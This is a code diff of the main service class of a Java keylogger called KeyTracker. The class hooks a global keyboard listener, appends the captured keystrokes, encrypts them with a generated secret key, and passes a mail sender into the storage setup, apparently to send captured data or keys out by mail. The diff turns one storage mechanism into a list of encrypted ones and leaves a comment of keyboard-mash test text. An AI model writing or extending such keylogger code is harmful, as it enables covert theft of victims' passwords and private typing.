@@ -1,32 +1,37 @@
 package com.keytracker;
 
+import com.keytracker.encrypt.Encryptor;
 import com.keytracker.encrypt.KeyGen;
 import com.keytracker.handlers.HandlersProvider;
 import com.keytracker.mail.MailSender;
+import com.keytracker.storing.StoreMechanism;
 import de.ksquared.system.keyboard.KeyListener;
+
+import javax.crypto.SecretKey;
+import java.util.List;
 
 public class KeyTrackerService {
     private final KeyListener keyListener;
-    private final StoreMechanism storeMechanism;
+    private final List<StoreMechanism> storeMechanisms;
 
     public KeyTrackerService(String[] args) {
         ArgsResolver argsResolver = new ArgsResolver(args);
         MailSender mailSender = new MailSender();
-        SecretKeyStore store = new SecretKeyStore(new KeyGen(), mailSender, argsResolver);
+        SecretKey secretKey = new SecretKeyStore(new KeyGen(), mailSender, argsResolver).secretKey();
 
         KeyAppender keyAppender = new KeyAppender();
-        MechanismsFactory mechanismsFactory = new MechanismsFactoryImpl(argsResolver, mailSender, store.secretKey());
-        this.storeMechanism = mechanismsFactory.getStoreMechanism();
-        this.storeMechanism.registerAppender(keyAppender);
+        MechanismsFactory mechanismsFactory = new MechanismsFactoryImpl(argsResolver, mailSender);
+        this.storeMechanisms = mechanismsFactory.getSingleStoreMechanisms(keyAppender, new Encryptor(secretKey));
 
         this.keyListener = new KeyListenerImpl(new AsciToStringKeyResolver(new HandlersProvider(new CharactersProvider())), keyAppender);
-    }
+    }// ok sprawdzam sosd feo ewo greo gkekd emskw fskwmf soekf eskw,d ejr eeeeeee zzzzzz aaaaa eeee wwww qqqq eeee rrrr tttt yyyy uuiiooooo ppqweeeee ttttt oksowodokwd ja je ja je ja jeeee
 
     public KeyListener getKeyListener() {
         return this.keyListener;
     }
 
-    public StoreMechanism getStoreMechanism() {
-        return this.storeMechanism;
+
+    public List<StoreMechanism> getStoreMechanisms() {
+        return storeMechanisms;
     }
 }
